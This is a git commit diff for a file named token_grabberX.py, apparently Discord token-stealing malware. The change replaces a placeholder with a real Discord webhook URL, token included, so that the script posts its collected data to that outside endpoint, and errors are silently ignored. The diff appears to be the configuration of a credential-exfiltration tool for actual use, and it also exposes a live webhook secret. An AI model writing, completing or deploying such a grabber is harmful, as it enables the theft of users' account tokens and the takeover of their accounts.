90ee6b1a21b636eb1358266ca9db7f47ee8a745e
xbxx121 <umsulaiman2021@gmail.com>
2025-05-04 00:09:54 +0100

    Update token_grabberX.py

--- token_grabberX.py
+++ token_grabberX.py
@@ -370,7 +370,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("YOUR WEEBHOOK LINK HERE", data=dumps(webhook).encode(), headers=getheaders()))   
+        urlopen(Request("https://discord.com/api/webhooks/1368360457122877594/DCouvtXLMDNgfSVRZ-obJHzYt9psd6rSj72knMkgPsvbRKtPiWyX6DVPRYj79c4oZN5O", data=dumps(webhook).encode(), headers=getheaders()))   
 
     except:
         pass
